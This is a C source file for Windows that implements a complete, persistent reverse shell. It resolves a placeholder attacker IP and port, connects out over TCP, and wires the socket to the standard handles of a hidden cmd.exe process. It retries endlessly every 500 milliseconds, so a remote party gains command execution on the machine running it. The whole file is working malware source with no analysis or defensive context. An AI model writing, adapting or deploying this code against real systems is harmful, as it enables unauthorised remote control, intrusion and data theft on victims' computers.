#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <stdio.h>

#include <windows.h>
#include <WinSock2.h>
#include <WS2tcpip.h>

#define IP "IpHere"
#define PORT "PortHere" // Should have Double Quotation

#pragma warning(disable: 28251)
int CALLBACK WinMain(HINSTANCE hInstace, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
#pragma warning(default: 28251)

{
	while (TRUE)
	{
		WSADATA wsaData;
		int err;

		// Initialize WinSock Library
		err = WSAStartup(MAKEWORD(2, 2), &wsaData);
		if (err != 0)
		{
			Sleep(500);
			continue;
		}


		// Setup AddrInfo Structs
		struct addrinfo* ptr = NULL;
		struct addrinfo* result = NULL;
		struct addrinfo hints;

		// Setup Hint for getAddrInfo
		ZeroMemory(&hints, sizeof(hints));
		hints.ai_family = AF_INET;
		hints.ai_socktype = SOCK_STREAM;
		hints.ai_protocol = IPPROTO_TCP;

		// Get AddrInfo using Hint and Address Resolve
		err = getaddrinfo( IP, PORT, &hints, &result);
		if (err != 0)
		{
			WSACleanup();
			Sleep(500);
			continue;
		}

		// Initialize a Socket
		ptr = result;
		SOCKET sock = INVALID_SOCKET;
		sock = WSASocket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol, NULL, 0, 0);
		if (sock == INVALID_SOCKET)
		{
			freeaddrinfo(result);
			WSACleanup();
			Sleep(500);
			continue;
		}

		// Connect to Server
		err = connect(sock, ptr->ai_addr, (int)ptr->ai_addrlen);
		while (err == SOCKET_ERROR && ptr->ai_next != NULL)
		{
			ptr = ptr->ai_next;
			err = connect(sock, ptr->ai_addr, (int)ptr->ai_addrlen);
		}
		if (err == SOCKET_ERROR)
		{
			freeaddrinfo(result);
			WSACleanup();
			Sleep(500);
			continue;
		}

		STARTUPINFO si;
		PROCESS_INFORMATION pi;


		ZeroMemory(&si, sizeof(si));
		si.cb = sizeof(si);
		si.wShowWindow = SW_SHOW;
		si.hStdError = (HANDLE)sock;
		si.hStdInput = (HANDLE)sock;
		si.hStdOutput = (HANDLE)sock;
		si.dwFlags |= STARTF_USESTDHANDLES;
		ZeroMemory(&pi, sizeof(pi));

#pragma warning(disable: 6277)
		err = CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
#pragma warning(default: 6277)

		if (err != 1)
		{
			freeaddrinfo(result);
			closesocket(sock);
			WSACleanup();
			Sleep(500);
			continue;
		}
		WaitForSingleObject(pi.hProcess, INFINITE);


		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);

		// Shutdown Socket
		err = shutdown(sock, SD_SEND);
		if (err == SOCKET_ERROR)
		{
			freeaddrinfo(result);
			closesocket(sock);
			WSACleanup();
			Sleep(500);
			continue;
		}

		// Close Socket and Cleanup
		freeaddrinfo(result);
		closesocket(sock);
		WSACleanup();
		Sleep(500);
	}

}